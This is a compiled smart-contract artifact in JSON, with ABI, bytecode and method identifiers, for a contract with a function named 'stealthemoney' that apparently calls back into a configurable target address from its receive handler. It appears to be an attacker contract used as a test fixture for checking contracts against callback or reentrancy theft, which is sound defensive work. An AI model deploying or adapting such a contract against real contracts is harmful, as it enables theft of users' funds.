{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"},{"name":"_callV1","type":"bool","internalType":"bool"},{"name":"_callV2","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"stealthemoney","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x60803460a557601f61075c38819003918201601f19168301916001600160401b0383118484101760a95780849260609460405283398101031260a55780516001600160a01b038116919082900360a55760636040605d6020840160bd565b920160bd565b5f805492151560a81b60ff60a81b16600162ffff0160a01b03199093169093179190911790151560b01b60ff60b01b1617905560405161069290816100ca8239f35b5f80fd5b634e487b7160e01b5f52604160045260245ffd5b5190811515820360a55756fe6080604090808252600490813610156104e9575b50361561001e575f80fd5b5f549160ff8360a01c161561002f57005b60ff60a01b198316600160a01b175f8190558151936001600160a01b0391908216803161005b87610562565b6001918288526020968789019088368337306100768b6105a0565b5287519361008385610562565b858552895f5b8181106104d95750508851633888087b60e11b8b820181905283825291906100b081610562565b6100b9876105a0565b526100c3866105a0565b508951946100d086610562565b8786528b8601988c368b37826100e5886105a0565b5260ff8160a81c165f1461024d5750505050989493918891875f54169789519b8c9862dc60bf60e71b8a52608060848b01928b01525180915260a4890192915f905b8282106102315750505050600319908188820301602489015285518082528482019185808360051b8301019801925f915b8383106101fc57505050505086850301604487015251928381520192915f5b888282106101e657505050505091815f81819530606483015203925af19081156101dd57506101a257005b3d805f843e6101b1818461057e565b820190828203126101d957815167ffffffffffffffff81116101d9576101d792016105e2565b005b5f80fd5b513d5f823e3d90fd5b845186528a965094850194909301928201610177565b929597999a509297958061021d8b939698601f198682030187528b51610637565b9901930193018c95938e9a99979592610158565b8351811685528e9a508d96948501949093019290870190610127565b939a999550969550965098995060ff915060b01c1661026857005b9095929184519261027884610562565b878452885f5b8181106104a15750508551948986015286855261029a85610562565b8551906102a682610532565b3082525f8a8301528682015260609460608201526102c3846105a0565b526102cd836105a0565b5084519687926330be556760e01b845260648401906060898601528551809252608485018b60848460051b8801019701975f925b8d8b8686106104465750505050505050505f92935081838160249630602483015230604483015203925af1801561043c5761033857005b3d805f863e610347818661057e565b84019385818603126101d957805167ffffffffffffffff918282116101d957019480601f870112156101d9578551938285116104295787808660051b96835190610393838a018361057e565b81520195880101968288116101d957888101955b8887106103b057005b86518581116101d95782019083601f1983870301126101d957835190848201828110888211176104175785528b83015180151581036101d957825284830151918783116101d957610408878e809695819601016105e2565b838201528152019601956103a7565b8860418c634e487b7160e01b5f52525ffd5b604186634e487b7160e01b5f525260245ffd5b82513d5f823e3d90fd5b81929496989a61048c91858e8b9d60839c989a9c19908503018b525160809289825116855286820151151587860152808201519085015201519181898201520190610637565b9a0194019401918b9694919897959398610301565b87999493959699516104b281610532565b5f81525f838201525f8982015260608082015282828901015201899098959492939861027e565b6060828289010152018a90610089565b5f3560e01c8063711010f6146105255763d4b839920361001357346101d9575f3660031901126101d9575f546001600160a01b03168152602090f35b5f3660031901126101d957005b6080810190811067ffffffffffffffff82111761054e57604052565b634e487b7160e01b5f52604160045260245ffd5b6040810190811067ffffffffffffffff82111761054e57604052565b90601f8019910116810190811067ffffffffffffffff82111761054e57604052565b8051156105ad5760200190565b634e487b7160e01b5f52603260045260245ffd5b5f5b8381106105d25750505f910152565b81810151838201526020016105c3565b81601f820112156101d957805167ffffffffffffffff811161054e5760405192610616601f8301601f19166020018561057e565b818452602082840101116101d95761063491602080850191016105c1565b90565b90602091610650815180928185528580860191016105c1565b601f01601f191601019056fea2646970667358221220fd7fc167dc7876171c899c0d1124d5917861a52c9a530ac71cb0999cee25bb8764736f6c63430008190033","linkReferences":{}},"methodIdentifiers":{"stealthemoney()":"711010f6","target()":"d4b83992"},"id":105}